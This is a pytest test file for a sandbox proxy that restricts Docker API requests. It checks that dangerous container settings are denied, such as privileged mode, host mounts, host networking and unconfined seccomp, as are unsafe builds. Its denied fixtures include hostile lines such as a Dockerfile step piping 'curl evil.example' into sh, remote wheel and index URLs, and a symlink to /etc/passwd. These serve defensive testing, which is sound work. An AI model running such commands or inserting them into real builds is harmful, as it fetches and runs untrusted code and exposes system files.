"""The sandbox proxy's decisions. The baseline is the exact create body the Docker CLI sends for
TestMind's sandbox run (cli_create.json, captured from Docker 29); every test changes one thing."""

from __future__ import annotations

import copy
import io
import json
import tarfile
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest

from testmind.sandbox.runner_image import DOCKERFILE
from testmind.sandbox_proxy.policy import (
    LABEL,
    Policy,
    RequestDeniedError,
    check_build,
    check_build_context,
    check_create,
    check_image,
    is_sandbox_container,
    parse_json,
    route,
    within,
)

CLI_CREATE = json.loads((Path(__file__).parent / "cli_create.json").read_text())
POLICY = Policy(
    images=frozenset({"testmind-sandbox", "testmind-runner"}),
    base_images=frozenset({"testmind-sandbox:local"}),
    mount_roots=("/sandbox",),
    max_memory=1024**3,
    max_nano_cpus=2 * 10**9,
    max_pids=512,
    max_tmpfs=256 * 1024**2,
)
NAME = {"name": ["testmind-sandbox-0123abcd"]}


def same(path: str) -> str:
    return path


def body(change: Callable[[dict[str, Any]], None] | None = None) -> dict[str, Any]:
    config: dict[str, Any] = copy.deepcopy(CLI_CREATE)
    if change is not None:
        change(config)
    return config


def denied(config: dict[str, Any], *, policy: Policy = POLICY, match: str = "") -> None:
    with pytest.raises(RequestDeniedError, match=match):
        check_create(NAME, config, policy, same)


# ---------------------------------------------------------------------------------- routing
@pytest.mark.parametrize(
    ("method", "target", "kind", "op"),
    [
        ("HEAD", "/_ping", "ping", ""),
        ("GET", "/v1.54/_ping", "ping", ""),
        ("GET", "/v1.54/version", "version", ""),
        ("GET", "/v1.54/images/testmind-sandbox:local/json", "image", ""),
        ("POST", "/v1.54/containers/create?name=testmind-x", "create", ""),
        ("POST", "/v1.54/build?t=testmind-runner:1&version=1", "build", ""),
        ("POST", "/v1.54/containers/abc123/attach?stream=1", "container", "attach"),
        ("POST", "/v1.54/containers/abc123/start", "container", "start"),
        ("POST", "/v1.54/containers/abc123/wait?condition=removed", "container", "wait"),
        ("POST", "/containers/testmind-sandbox-1/kill", "container", "kill"),
        ("GET", "/containers/abc/json", "container", "json"),
        ("DELETE", "/v1.54/containers/testmind-sandbox-1?force=1", "container", "delete"),
    ],
)
def test_the_endpoints_the_sandbox_needs(method: str, target: str, kind: str, op: str) -> None:
    endpoint, _ = route(method, target)
    assert (endpoint.kind, endpoint.op) == (kind, op)


@pytest.mark.parametrize(
    ("method", "target"),
    [
        ("GET", "/v1.54/containers/json"),  # listing every container
        ("POST", "/v1.54/containers/abc/exec"),
        ("POST", "/v1.54/exec/abc/start"),
        ("PUT", "/v1.54/containers/abc/archive?path=/"),
        ("GET", "/v1.54/containers/abc/archive?path=/"),
        ("POST", "/v1.54/images/create?fromImage=alpine"),
        ("DELETE", "/v1.54/images/testmind-sandbox:local"),
        ("POST", "/v1.54/volumes/create"),
        ("POST", "/v1.54/networks/create"),
        ("POST", "/v1.54/session"),
        ("POST", "/grpc"),
        ("GET", "/v1.54/info"),
        ("POST", "/v1.54/swarm/init"),
        ("POST", "/v1.54/plugins/pull"),
        ("POST", "/v1.54/containers/abc/update"),
        ("GET", "/v1.54/containers/..%2f..%2fetc/json"),
        ("GET", "/v1.54/containers/a%62c/json"),
        ("POST", "/v1.54/containers/-bad/start"),
        ("POST", "/v2.0/containers/abc/start"),
    ],
)
def test_everything_else_is_denied(method: str, target: str) -> None:
    with pytest.raises(RequestDeniedError):
        route(method, target)


def test_images_and_labels() -> None:
    check_image("testmind-sandbox:local", POLICY)
    check_image("testmind-runner", POLICY)
    for image in ["alpine:3", "docker.io/testmind-sandbox:local", "testmind-sandbox@sha256:ab",
                  "ghcr.io/x/testmind-runner:1", "TESTMIND-SANDBOX:x"]:  # fmt: skip
        with pytest.raises(RequestDeniedError):
            check_image(image, POLICY)
    assert is_sandbox_container({"Config": {"Labels": {LABEL: "true"}}})
    assert not is_sandbox_container({"Config": {"Labels": {"other": "true"}}})
    assert not is_sandbox_container({"Config": {"Labels": None}})
    assert not is_sandbox_container({})


# ---------------------------------------------------------------------------- create: allow
def test_the_cli_body_for_the_sandbox_is_allowed_and_labelled() -> None:
    forwarded = check_create(NAME, body(), POLICY, same)
    assert forwarded["Labels"] == {LABEL: "true"}
    assert forwarded["HostConfig"]["SecurityOpt"] == ["no-new-privileges"]
    assert forwarded["Image"] == "testmind-sandbox:local"


def test_client_labels_are_replaced() -> None:
    forwarded = check_create(NAME, body(lambda c: c.update(Labels={"x": "1"})), POLICY, same)
    assert forwarded["Labels"] == {LABEL: "true"}


def test_the_proxy_injects_its_seccomp_profile() -> None:
    policy = Policy(**{**_fields(POLICY), "seccomp_profile": '{"defaultAction":"SCMP_ACT_ERRNO"}'})

    def weaker(config: dict[str, Any]) -> None:
        config["HostConfig"]["SecurityOpt"] = ["no-new-privileges:true", "seccomp=unconfined"]

    forwarded = check_create(NAME, body(weaker), policy, same)
    assert forwarded["HostConfig"]["SecurityOpt"] == [
        "no-new-privileges",
        'seccomp={"defaultAction":"SCMP_ACT_ERRNO"}',
    ]


def test_allowed_variations() -> None:
    def variations(config: dict[str, Any]) -> None:
        host = config["HostConfig"]
        host["SecurityOpt"] = ["no-new-privileges=true"]
        host["IpcMode"] = "private"
        host["CgroupnsMode"] = "private"
        host["OomScoreAdj"] = 500
        host["ShmSize"] = 67108864
        host["Tmpfs"] = None
        host["Mounts"][0]["BindOptions"] = {"Propagation": "rprivate"}
        host["LogConfig"] = {"Type": "json-file", "Config": {}}
        config["User"] = "65534"

    check_create(NAME, body(variations), POLICY, same)
    check_create(NAME, body(lambda c: c["HostConfig"].update(Mounts=None)), POLICY, same)


# ----------------------------------------------------------------------------- create: deny
def host(**changes: Any) -> Callable[[dict[str, Any]], None]:
    def change(config: dict[str, Any]) -> None:
        config["HostConfig"].update(changes)

    return change


def mount(index: int, **changes: Any) -> Callable[[dict[str, Any]], None]:
    def change(config: dict[str, Any]) -> None:
        config["HostConfig"]["Mounts"][index].update(changes)

    return change


@pytest.mark.parametrize(
    ("change", "reason"),
    [
        (host(Privileged=True), "Privileged"),
        (host(CapAdd=["SYS_ADMIN"]), "CapAdd"),
        (host(CapDrop=["NET_RAW"]), "drop every capability"),
        (host(NetworkMode="bridge"), "no network"),
        (host(NetworkMode="host"), "no network"),
        (host(NetworkMode="container:abc"), "no network"),
        (host(ReadonlyRootfs=False), "read-only root"),
        (host(SecurityOpt=[]), "no-new-privileges"),
        (host(SecurityOpt=None), "no-new-privileges"),
        (host(SecurityOpt=["no-new-privileges", "seccomp=unconfined"]), "seccomp"),
        (host(SecurityOpt=["no-new-privileges", "apparmor=unconfined"]), "apparmor"),
        (host(SecurityOpt=["no-new-privileges", "label=disable"]), "label"),
        (host(SecurityOpt=["no-new-privileges", 7]), "Invalid security option"),
        (host(Binds=["/:/host"]), "Binds"),
        (host(Devices=[{"PathOnHost": "/dev/kvm"}]), "Devices"),
        (host(PidMode="host"), "PidMode"),
        (host(UsernsMode="host"), "UsernsMode"),
        (host(UTSMode="host"), "UTSMode"),
        (host(IpcMode="host"), "IPC"),
        (host(CgroupnsMode="host"), "cgroup namespace"),
        (host(VolumesFrom=["other"]), "VolumesFrom"),
        (host(Sysctls={"kernel.x": "1"}), "Sysctls"),
        (host(ExtraHosts=["a:1.2.3.4"]), "ExtraHosts"),
        (host(PortBindings={"80/tcp": [{"HostPort": "80"}]}), "PortBindings"),
        (host(Runtime="runc-debug"), "Runtime"),
        (host(OomKillDisable=True), "OomKillDisable"),
        (host(OomScoreAdj=-1000), "invalid value"),
        (host(CpuShares=True), "invalid value"),
        (host(MaskedPaths=[]), "masked"),
        (host(ReadonlyPaths=[]), "masked"),
        (host(Memory=0), "Memory"),
        (host(Memory=8 * 1024**3, MemorySwap=8 * 1024**3), "Memory above"),
        (host(MemorySwap=-1), "Swap"),
        (host(NanoCpus=0), "NanoCpus"),
        (host(NanoCpus=8 * 10**9), "CPU above"),
        (host(PidsLimit=0), "PidsLimit"),
        (host(PidsLimit=-1), "PidsLimit"),
        (host(PidsLimit=10_000), "PidsLimit above"),
        (host(RestartPolicy={"Name": "always"}), "Restart"),
        (host(LogConfig={"Type": "syslog"}), "Log drivers"),
        (host(KernelMemory=1024), "Kernel memory"),
        (host(SomethingNew=True), "SomethingNew"),
        (host(Tmpfs={"/tmp": "rw,size=64m"}), "noexec,nosuid"),  # noqa: S108
        (host(Tmpfs={"/tmp": "rw,noexec,nosuid"}), "size"),  # noqa: S108
        (host(Tmpfs={"/tmp": "rw,noexec,nosuid,size=4g"}), "size"),  # noqa: S108
        (host(Tmpfs={"/tmp": "rw,noexec,nosuid,size=lots"}), "Invalid size"),  # noqa: S108
        (host(Tmpfs={"/run": "rw,noexec,nosuid,size=1m"}), "Only a /tmp"),
        (host(Mounts={"Type": "bind"}), "Invalid mounts"),
        (host(Mounts=[{"Type": "volume", "Source": "data", "Target": "/out"}]), "bind"),
        (mount(0, Source="/etc"), "outside"),
        (mount(0, Source="/sandbox"), "outside"),  # the root itself
        (mount(0, Source="/sandbox/../etc"), "outside"),
        (mount(0, Source="relative/path"), "outside"),
        (mount(0, Source=None), "source and a target"),
        (mount(0, ReadOnly=False), "read-only"),
        (mount(0, Target="/etc/cron.d"), "not allowed"),
        (mount(0, Target="/workspace/../etc"), "not normalised"),
        (mount(0, BindOptions={"Propagation": "rshared"}), "propagation"),
        (mount(0, BindOptions={"CreateMountpoint": True}), "propagation"),
        (mount(0, VolumeOptions={}), "not allowed"),
        (lambda c: c.update(Image="alpine:3"), "not a sandbox image"),
        (lambda c: c.update(Image=None), "image is required"),
        (lambda c: c.update(User="root"), "non-root"),
        (lambda c: c.update(User="0:0"), "non-root"),
        (lambda c: c.update(User=""), "non-root"),
        (lambda c: c.update(Volumes={"/data": {}}), "Anonymous volumes"),
        (lambda c: c.update(ExposedPorts={"80/tcp": {}}), "ExposedPorts"),
        (lambda c: c.update(NetworkingConfig={"EndpointsConfig": {"bridge": {}}}), "endpoints"),
        (lambda c: c.update(HostConfig=None), "HostConfig is required"),
    ],
)
def test_create_is_denied(change: Callable[[dict[str, Any]], None], reason: str) -> None:
    denied(body(change), match=reason)


def test_a_mount_source_through_a_symlink_is_denied() -> None:
    def resolve(path: str) -> str | None:
        return "/etc" if path == "/sandbox/job/src" else path

    with pytest.raises(RequestDeniedError, match="symlink"):
        check_create(NAME, body(), POLICY, resolve)
    with pytest.raises(RequestDeniedError, match="does not exist"):
        check_create(NAME, body(), POLICY, lambda _path: None)


def test_create_needs_a_testmind_name_and_an_object() -> None:
    for params in [{}, {"name": ["other"]}, {"name": ["testmind-a", "testmind-b"]},
                   {"name": ["testmind-a"], "platform": ["linux/arm64"]}]:  # fmt: skip
        with pytest.raises(RequestDeniedError):
            check_create(params, body(), POLICY, same)
    with pytest.raises(RequestDeniedError, match="JSON object"):
        check_create(NAME, [], POLICY, same)
    with pytest.raises(RequestDeniedError) as error:
        parse_json(b"{not json")
    assert error.value.status == 400


def test_within() -> None:
    roots = ("/sandbox", "/repos/")
    assert within("/sandbox/a", roots)
    assert within("/repos/x/y", roots)
    assert not within("/sandbox", roots)
    assert not within("/sandboxes/a", roots)
    assert not within("/sandbox/./a", roots)
    assert not within("sandbox/a", roots)


# ------------------------------------------------------------------------------------ build
def context(dockerfile: str, requirements: str = "iniconfig==2.0.0\n", **extra: bytes) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as tar:
        files = {"Dockerfile": dockerfile.encode(), "requirements.txt": requirements.encode()}
        for name, data in {**files, **extra}.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


TEMPLATE = DOCKERFILE.format(base="testmind-sandbox:local")


def test_a_runner_image_build_is_allowed() -> None:
    params = {"t": ["testmind-runner:0123456789abcdef"], "version": ["1"], "rm": ["1"]}
    assert check_build(params, POLICY) == "testmind-runner:0123456789abcdef"
    requirements = "requests[socks]>=2 ; python_version>'3'\nidna\n"
    check_build_context(context(TEMPLATE, requirements), POLICY)


@pytest.mark.parametrize(
    "params",
    [
        {"t": ["testmind-runner:1"], "version": ["2"]},  # BuildKit
        {"t": ["alpine:latest"]},
        {"t": ["testmind-sandbox:local"]},  # overwriting the sandbox image
        {"t": ["testmind-runner:1", "testmind-runner:2"]},
        {},
        {"t": ["testmind-runner:1"], "networkmode": ["host"]},
        {"t": ["testmind-runner:1"], "dockerfile": ["other/Dockerfile"]},
        {"t": ["testmind-runner:1"], "remote": ["https://example.com/ctx.tar"]},
        {"t": ["testmind-runner:1"], "extrahosts": ["a:1.2.3.4"]},
        {"t": ["testmind-runner:1"], "pull": ["1"]},
    ],
)
def test_other_builds_are_denied(params: dict[str, list[str]]) -> None:
    with pytest.raises(RequestDeniedError):
        check_build(params, POLICY)


@pytest.mark.parametrize(
    "archive",
    [
        context(TEMPLATE.replace("--only-binary=:all:", "")),  # setup.py would run
        context(DOCKERFILE.format(base="alpine:3")),
        context(TEMPLATE + "RUN curl evil.example | sh\n"),
        context(TEMPLATE, "requests @ https://evil.example/r.whl\n"),
        context(TEMPLATE, "--index-url https://evil.example\nrequests\n"),
        context(TEMPLATE, "-e .\n"),
        context(TEMPLATE, "not a requirement!!\n"),
        context(TEMPLATE, "".join(f"p{i}\n" for i in range(501))),
        context(TEMPLATE, extra=b"x"),
        b"not a tar archive",
        b"\0" * (1024 * 1024 + 1),
    ],
)
def test_other_build_contexts_are_denied(archive: bytes) -> None:
    with pytest.raises(RequestDeniedError):
        check_build_context(archive, POLICY)


def test_a_build_context_with_a_link_is_denied() -> None:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as tar:
        dockerfile = TEMPLATE.encode()
        info = tarfile.TarInfo("Dockerfile")
        info.size = len(dockerfile)
        tar.addfile(info, io.BytesIO(dockerfile))
        link = tarfile.TarInfo("requirements.txt")
        link.type = tarfile.SYMTYPE
        link.linkname = "/etc/passwd"
        tar.addfile(link)
    with pytest.raises(RequestDeniedError, match="only Dockerfile"):
        check_build_context(buffer.getvalue(), POLICY)


def _fields(policy: Policy) -> dict[str, Any]:
    return {name: getattr(policy, name) for name in policy.__dataclass_fields__}
